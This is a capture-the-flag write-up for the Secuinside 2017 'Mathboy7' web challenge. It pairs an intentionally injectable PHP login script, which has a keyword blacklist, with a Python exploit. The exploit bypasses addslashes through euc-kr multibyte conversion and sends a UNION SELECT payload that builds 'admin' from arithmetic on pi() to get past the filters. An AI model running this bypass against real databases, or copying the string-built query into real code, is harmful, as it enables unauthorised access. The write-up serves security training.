# Challenge 
```php 
<?php
    #made by adm1nkyj
    error_reporting(0);
    include('./flag.php');
    
    echo 'login as admin kkk<br/>';

    $filter = ['conv', 'code', 'hex', 'ha', 'b', 'x', '_', '`', '\'', '"', '@','into','outfile','load','file', 'date', 'co','ca', 'b', 'g', 'h', 'j', 'k', 'q', 'v', 'x', 'z', 'date', 'make', 'day', 'name', 'replace', 'insert', 'pad', 'ascii', 'user', 'version', 'db', 'data', 'base'];

    $id = addslashes($_GET['id']);
    $pw = addslashes($_GET['pw']);
    $id = mb_convert_encoding($id, 'utf-8', 'euc-kr');
    if(strlen($pw)>=370) die('no hack');
    foreach ($filter as $_str) 
    { 
        if(strpos(strtolower($_GET['id']), $_str) !== false || strpos(strtolower($_GET['pw']), $_str) !== false)
        {
            echo $_str;
            exit('no hack');
        }
    }
    if(preg_match('/[0-9]/', $_GET['id']) || preg_match('/[0-9]/', $_GET['pw']))
    {
        exit('no hack');
    }
    
    $query = mysql_fetch_array(mysql_query("SELECT * FROM user WHERE id='{$id}' AND pw='{$pw}';"));
    if($query['id'])
    {
        if(strtolower($query['id']) === 'admin')
        {
            exit($flag);
        }
        else
        {
            echo "your id : ".$query['id'];
        }
    }
    echo "<hr>";
    show_source(__FILE__);
?>
```

# Solution

```python
import requests

exploit = "mid%28encrypt%28ceil%28pi%28%29%2Api%28%29%29%2Aceil%28pi%28%29%2Api%28%29%29%2Aceil%28pi%28%29%2Api%28%29%29%2Aceil%28pi%28%29%2Api%28%29%29%2Afloor%28pi%28%29%29%2Bceil%28pi%28%29%2Api%28%29%29%2Aceil%28pi%28%29%2Api%28%29%29%2Aceil%28pi%28%29%2Api%28%29%29%2Aceil%28pi%28%29%29%2Bceil%28pi%28%29%2Api%28%29%29%2Aceil%28pi%28%29%2Api%28%29%29%2Afloor%28pi%28%29%2Api%28%29%29%2Bceil%28pi%28%29%2Api%28%29%29%2A%28floor%28pi%28%29%2Api%28%29%29-true%29%2Cmid%28password%28true%2Btrue%29%2Cfloor%28pi%28%29%2Api%28%29%2Afloor%28pi%28%29%29%29%2Btrue%2Btrue%2Ctrue%2Btrue%29%29%2Ctrue%2C%20%28ceil%28pi%28%29%29%2Btrue%29%29"
url = "http://localhost/php_challenge/30.php?id=%bf%5c&pw=%20union%20select%20"+exploit+",pi(),pi()%23"

print url
print requests.get(url).text
```

# Refference
+ [Secuinside CTF 2017 Web415: Mathboy7 Writeup](https://github.com/adm1nkyj/ctfwriteup/tree/master/my_task/secuinside_2017/mathboy7)

